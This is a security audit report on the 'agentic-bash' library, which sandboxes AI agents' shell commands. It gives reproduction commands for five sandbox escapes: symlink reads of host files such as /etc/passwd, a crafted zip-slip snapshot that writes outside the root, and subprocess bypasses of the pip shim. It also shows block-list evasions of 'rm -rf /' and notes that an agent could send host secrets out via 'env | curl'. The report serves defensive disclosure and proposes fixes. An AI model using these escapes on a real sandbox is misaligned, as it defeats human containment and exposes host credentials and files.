# Sandbox Jailbreak Report
**Date:** 2026-03-22
**Target:** agentic-bash sandboxing library
**Profiles tested:** root (--privileged), locked (--cap-drop ALL + minimal caps)
**Isolation layers tested:** noop, landlock, namespace/auto, network (deny/allow), pip shim, snapshot/restore

---

## Executive Summary

A comprehensive security audit of the `agentic-bash` sandboxing library was performed across all isolation layers, targeting both Docker-based runtime attacks and static code analysis. The library provides a layered defense model — virtual filesystem, pure-Go shell interpreter (mvdan.cc/sh), Landlock LSM, Linux namespaces, and package-manager shims — but multiple critical vulnerabilities allow an attacker to read arbitrary host files and write to arbitrary host paths from inside the sandbox.

**Five confirmed escapes were found**, two of which are Critical severity (full arbitrary read/write from inside the sandbox) and three High severity (subprocess escape bypassing all shim and intercept layers). These vulnerabilities affect all isolation profiles tested — including the hardened `locked` profile with capabilities dropped — when using `isolation=none` or `isolation=landlock`. The `isolation=namespace` (CLONE_NEWNS) approach provides stronger subprocess containment but does not fix the symlink or snapshot escape paths.

On a positive note, network denial (`--network deny`) was confirmed working correctly via `CLONE_NEWNET`. The virtual path translation layer and synthetic sysinfo illusions (hostname, whoami, uname) function as designed. The `stripFlag` implementation in the pip shim correctly handles both `--flag value` and `--flag=value` forms.

## Confirmed Escapes

---

### 1. Symlink Escape: Arbitrary Host File Read
**Severity:** Critical
**Isolation layer bypassed:** Filesystem (OsFS containment), Landlock LSM
**Docker profile affected:** root, locked (all profiles)

**Vulnerability:**
The containment check in `fs/fs.go` (`containedBy`) uses `filepath.Clean()` which normalizes `..` sequences but **does not resolve symlinks**. The check is string-prefix based on cleaned paths only. When a symlink is created inside the sandbox pointing to a host path, the check passes (the symlink's own path is inside the root), and the underlying `afero.OsFs.OpenFile()` then follows the symlink to the real host path. Landlock LSM does not block this because both the symlink target path (`/etc/passwd`) and the sandbox root are in the Landlock allowlist.

**Reproduction steps (confirmed in root and locked containers):**
```bash
# isolation=none
agentic-bash run --isolation none \
  --cmd 'ln -s /etc/passwd /home/user/hostlink; cat /home/user/hostlink'

# isolation=landlock — ALSO BYPASSED
agentic-bash run --isolation landlock \
  --cmd 'ln -s /etc/passwd /home/user/hostlink; cat /home/user/hostlink'

# Symlink can also reach paths OUTSIDE the Landlock allowlist
agentic-bash run --isolation landlock \
  --cmd 'ln -s /var/log /home/user/loglink; ls /home/user/loglink/'
  # Output: alternatives.log apt dpkg.log faillog lastlog wtmp ...
```

**Impact:**
An attacker can read any file readable by the process running the sandbox (e.g., `/etc/shadow`, host SSH private keys at `/root/.ssh/id_rsa`, cloud credential files, application secrets). Symlinks can also reach paths outside the Landlock allowlist (e.g., `/root`, `/var`), completely defeating that protection for read operations.

**Root cause in code:**
- [fs/fs.go:53-56](fs/fs.go#L53-L56) — `containedBy()` uses `filepath.Clean()` not `filepath.EvalSymlinks()`
- [fs/realfs.go:38-40](fs/realfs.go#L38-L40) — `check()` calls `checkContainment()` which has the same defect
- [fs/handler.go:41-43](fs/handler.go#L41-L43) — `containedBy()` used before routing to `sfs.OpenFile()`

**Suggested fix:**
Resolve symlinks before containment check:
```go
func checkContainment(root, name string) error {
    resolved, err := filepath.EvalSymlinks(name)
    if err != nil && !os.IsNotExist(err) {
        return fmt.Errorf("%w: cannot resolve path: %s", stdfs.ErrPermission, name)
    }
    if err == nil {
        name = resolved
    }
    if !containedBy(root, filepath.Clean(name)) {
        return fmt.Errorf("%w: path escapes sandbox root: %s", stdfs.ErrPermission, name)
    }
    return nil
}
```

### 2. Zip-Slip in Snapshot Restore: Arbitrary Host File Write
**Severity:** Critical
**Isolation layer bypassed:** Filesystem (snapshot/restore)
**Docker profile affected:** all profiles

**Vulnerability:**
`fs/snapshot.go`'s `Restore()` function extracts tar entries using `filepath.Join(root, hdr.Name)`. The `filepath.Join` call normalizes `..` components, so a tar entry named `../../etc/passwd` resolves to `/etc/passwd` on the host — completely outside the sandbox root. There is no `filepath.Rel()` validation to ensure extracted paths remain under `root`.

**Reproduction steps (confirmed in root container):**
```python
# Step 1: Craft the malicious snapshot (Python)
import tarfile, io

buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode="w") as tf:
    content = b"compromised"
    info = tarfile.TarInfo(name="../../tmp/JAILBREAK_PROOF.txt")
    info.size = len(content)
    tf.addfile(info, io.BytesIO(content))

with open("/tmp/evil_snapshot.tar", "wb") as f:
    f.write(buf.getvalue())
```
```bash
# Step 2: Restore via CLI (or programmatic Restore() call)
agentic-bash restore --in /tmp/evil_snapshot.tar --isolation none <<< "exit"

# Step 3: Verify escape
cat /tmp/JAILBREAK_PROOF.txt
# Output: compromised
```

**Impact:**
An attacker who can supply a snapshot (e.g., via a shared snapshot service, a compromised agent output, or a crafted API response) can write arbitrary content to any path writable by the sandbox process — including overwriting binaries, cron jobs, SSH authorized_keys, or sudoers files.

**Root cause in code:**
- [fs/snapshot.go:94](fs/snapshot.go#L94) — `target := filepath.Join(root, hdr.Name)` with no path validation

**Suggested fix:**
```go
target := filepath.Join(root, hdr.Name)
// Validate that target is under root
rel, err := filepath.Rel(root, target)
if err != nil || strings.HasPrefix(rel, "..") {
    return fmt.Errorf("restore: path traversal in snapshot entry %q", hdr.Name)
}
```

### 3. Subprocess Escape: Pip Shim Bypass via Python subprocess
**Severity:** High
**Isolation layer bypassed:** Package manager shim (pip)
**Docker profile affected:** root, locked (all profiles with isolation=none)

**Vulnerability:**
The pip shim only intercepts commands that go through `mvdan.cc/sh`'s `ExecHandlerFunc` chain. Any process spawned as a child of an external command (a "grandchild" subprocess) runs completely outside this chain. Spawning `pip3` via `python3 -c "import subprocess; subprocess.run(['pip3', '--target=/host/path', ...])"` bypasses the shim entirely, allowing installation to arbitrary host filesystem locations.

**Reproduction steps (confirmed in root and locked containers):**
```bash
agentic-bash run --isolation none \
  --cmd 'python3 -c "
import subprocess
r = subprocess.run(
    [\"pip3\", \"install\", \"--target=/tmp/escaped_pip\", \"requests\"],
    text=True, capture_output=True
)
print(r.returncode, r.stderr[:100])
"'
# Output: 0 WARNING: Running pip as the 'root' user...

# Verify on host:
ls /tmp/escaped_pip/
# Output: requests/  requests-2.x.dist-info/  ...
```

**Impact:**
An attacker can install Python packages to arbitrary host directories (e.g., `/usr/lib/python3`, `~/.local/lib`), potentially poisoning the host Python environment or placing executable code in predictable import paths.

**Root cause in code:**
- [packages/shim.go:35-45](packages/shim.go#L35-L45) — Shim is only invoked for commands run directly through `mvdan.cc/sh`'s ExecHandlerFunc; grandchild processes are uncontrolled.

**Suggested fix:**
The fundamental issue is that OS-level process isolation (namespaces, Landlock) is required to contain subprocess spawning. As a defense-in-depth measure, the sandbox should:
1. Block `subprocess`, `os.system`, `multiprocessing`, etc. via a Python startup hook or sitecustomize injection
2. Enforce isolation level >= `IsolationNamespace` when package shims are active
3. Document that `IsolationNone` is not sufficient for sandboxing language runtimes

### 4. General Subprocess Escape: External Commands Run Unconstrained
**Severity:** High
**Isolation layer bypassed:** Intercept layer (call handler, path rewriting, all shims)
**Docker profile affected:** all profiles with isolation=none

**Vulnerability:**
Any external command invoked through `mvdan.cc/sh` can spawn its own child processes via `exec()`, `system()`, `fork()`, or language-level equivalents. These grandchild processes run completely outside the `mvdan.cc/sh` ExecHandlerFunc chain, bypassing all intercept logic: audit logging, block lists, path rewriting, and package shims. Only OS-level isolation (namespaces, Landlock, cgroups) constrains them.

**Reproduction steps (confirmed in root container):**
```bash
agentic-bash run --isolation none \
  --cmd 'bash -c "echo ESCAPED > /tmp/bash_subprocess_escape.txt"'

# Verify on host:
ls /tmp/bash_subprocess_escape.txt
# File exists on real host filesystem
```

Also confirmed via python3:
```bash
agentic-bash run --isolation none \
  --cmd 'python3 -c "import subprocess; r=subprocess.run([\"bash\",\"-c\",\"id; cat /etc/hostname\"], text=True, capture_output=True); print(r.stdout)"'
# Output: uid=1000(agent) gid=1000(agent) groups=1000(agent)\nagentic-bash-vm
```

**Impact:**
Without OS-level isolation, any external command can trivially bypass the entire intercept layer by spawning a child process. Shell scripts, Python, Node.js, and any language with subprocess APIs can escape.

**Root cause in code:**
- [executor/intercept/callhook.go:38-85](executor/intercept/callhook.go#L38-L85) — Intercept only applies at the `mvdan.cc/sh` layer, not to grandchild processes
- Architecture: `IsolationNone` provides only shell illusions; no OS-level process containment

**Suggested fix:**
Document prominently that `IsolationNone` provides **zero process containment** and must not be used for untrusted workloads. The README and API docs should explicitly warn that isolation >= `IsolationNamespace` is required to contain subprocess execution.

### 5. Block List Prefix-Match Bypass
**Severity:** Medium
**Isolation layer bypassed:** Intercept (call handler block list)
**Docker profile affected:** all profiles

**Vulnerability:**
The block list in `callhook.go` uses `strings.HasPrefix(joined, pattern)` where `joined = strings.Join(args, " ")`. This means the pattern `"rm -rf /"` blocks `rm -rf /` but NOT `/bin/rm -rf /` (full path bypasses the prefix) or `\rm -rf /` (backslash-escaped command). Additionally, changing argument order (`rm / -rf`) also bypasses the check.

**Reproduction (code-level, no execution needed):**
```go
// BlockList: []string{"rm -rf /"}
//
// BLOCKED:
// args = ["rm", "-rf", "/"]     → joined = "rm -rf /"        → HasPrefix = true
//
// NOT BLOCKED (bypasses):
// args = ["/bin/rm", "-rf", "/"]  → joined = "/bin/rm -rf /" → HasPrefix = false
// args = ["\\rm", "-rf", "/"]     → joined = "\\rm -rf /"    → HasPrefix = false
// args = ["rm", "/", "-rf"]       → joined = "rm / -rf"      → HasPrefix = false
```

Verified with Python simulation matching the Go `strings.HasPrefix` behavior:
```
/bin/rm -rf / → blocked=False  (BYPASS)
\rm -rf /     → blocked=False  (BYPASS)
rm -rf /      → blocked=True   (correctly blocked)
```

**Impact:**
Block lists intended to prevent dangerous operations can be trivially bypassed by callers who know the full binary path or use minor argument variations.

**Root cause in code:**
- [executor/intercept/callhook.go:55-62](executor/intercept/callhook.go#L55-L62) — `strings.HasPrefix()` on space-joined args

**Suggested fix:**
Match against `filepath.Base(args[0])` separately and apply the pattern only to arguments, or use a richer matching language (regex, AST-based rules). At minimum, document that block lists provide advisory-level blocking only, not security guarantees.

## Partial Successes / Interesting Behaviors

### `EnvPresetInheritHost` — Host Secrets Exposure
When `Options.EnvPreset = EnvPresetInheritHost` is set, `session.go`'s `hostEnvMap()` copies the **entire host process environment** into the sandbox — including `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `DATABASE_URL`, and any other secrets the host process has. No filtering or sanitization is performed. This is a design choice (the preset exists intentionally), but it creates a serious footgun: AI agents running with this preset can exfiltrate host credentials via `env | curl ...`. Code reference: [sandbox/session.go:50-52](sandbox/session.go#L50-L52).

### Locked Container: Namespace Isolation Fails Silently
In the `locked` profile (`--cap-drop ALL` + minimal caps), the `isolation=auto` strategy attempts `IsolationNamespace` (CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWPID), but external command spawning fails with `"operation not permitted"`. This occurs because creating user namespaces requires capabilities the locked profile drops. The sandbox falls back to running commands with no subprocess isolation at all — but this fallback is not surfaced to the caller. **The user believes they have namespace isolation but actually have none.**

### `/proc/self/fd/` Passthrough — Confined to mvdan.cc/sh Context
The `isHostPassthrough()` function in `handler.go` passes through `/proc/self/fd/` paths to the real OS. While this could allow reading FDs opened by the parent Go process (if their numbers are known), in practice the mvdan.cc/sh interpreter doesn't expose parent FDs directly. No confirmed escape found, but the passthrough surface deserves scrutiny if the sandbox is embedded in processes with sensitive open FDs.

## Attack Surface Notes

1. **No seccomp filter**: The library does not apply a seccomp filter to external subprocesses. Dangerous syscalls (`ptrace`, `mount`, `chroot`, `mknod`) are available inside the sandbox when isolation < Namespace.

2. **Landlock allowlist too permissive**: The allowlist includes `/etc` (readable), meaning symlinks to `/etc/shadow`, `/etc/sudoers`, etc. are reachable even with Landlock active.

3. **`/proc` in Landlock allowlist**: Including `/proc` in the allowlist grants read access to `/proc/1/cmdline`, `/proc/[pid]/maps`, `/proc/[pid]/fd`, etc., enabling process enumeration and potential sensitive data exposure.

4. **Silent fallback for namespace isolation**: When `CLONE_NEWUSER` fails (locked profile), the sandbox silently runs with noop isolation. The caller cannot distinguish failed-isolation from successful isolation via the public API.

5. **`hostPathExists()` TOCTOU**: In `callhook.go:97-99`, `os.Stat(p)` is called to decide whether to rewrite a path argument. Between the `stat` call and the actual command execution, a symlink could be swapped in, causing the wrong path to be used.

6. **macOS: zero OS-level isolation**: All OS-level isolation (Landlock, namespaces, cgroups, network deny) is silently no-op on macOS. Using the library on macOS provides only shell-level illusions. There is no warning emitted when isolation degrades to noop on macOS.

## Recommendations

**Critical (fix immediately):**
1. **Symlink resolution in containment check** ([fs/fs.go:61-65](fs/fs.go#L61-L65)): Use `filepath.EvalSymlinks()` before every path containment check. Fall back to denying access when the target is outside the sandbox root.
2. **Zip-slip validation in Restore** ([fs/snapshot.go:94](fs/snapshot.go#L94)): Validate every tar entry name with `filepath.Rel(root, target)` before extraction; reject any entry whose relative path starts with `..`.

**High (fix before production use):**
3. **Document IsolationNone subprocess risk**: Make it explicit in API docs and README that `IsolationNone` provides zero subprocess containment and must not be used for untrusted code.
4. **Surface isolation fallback to caller**: When namespace creation fails, return an error or expose the actual isolation level used via a callback/option, rather than silently falling back.
5. **Block list documentation**: Document that the block list is advisory-only (not a security boundary) and that full-path invocations bypass it.

**Medium:**
6. **`EnvPresetInheritHost` warning**: Emit a compile-time or runtime warning when this preset is used, listing common sensitive variable patterns.
7. **Refine Landlock allowlist**: Remove `/etc` from read-write rules (make it read-only), remove `/proc` or restrict to `/proc/self` only.
8. **Add seccomp filter**: Block `ptrace`, `mount`, `chroot`, `mknod`, `kexec_load` at minimum.
9. **macOS warning on isolation degradation**: Emit a log warning when running on non-Linux where OS isolation is unavailable.

**Low:**
10. **Fix TOCTOU in `hostPathExists()`**: Use `O_PATH` + `AT_EMPTY_PATH` fstat instead of `os.Stat()` to avoid the race window.
